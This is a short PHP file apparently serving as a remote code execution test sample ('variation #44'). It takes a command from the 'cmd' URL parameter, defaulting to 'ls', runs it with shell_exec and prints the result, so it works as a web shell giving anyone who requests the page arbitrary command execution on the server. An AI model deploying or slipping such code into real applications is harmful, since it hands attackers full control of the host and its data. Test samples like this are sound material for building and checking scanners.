<?php
// RCE test variation #44
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>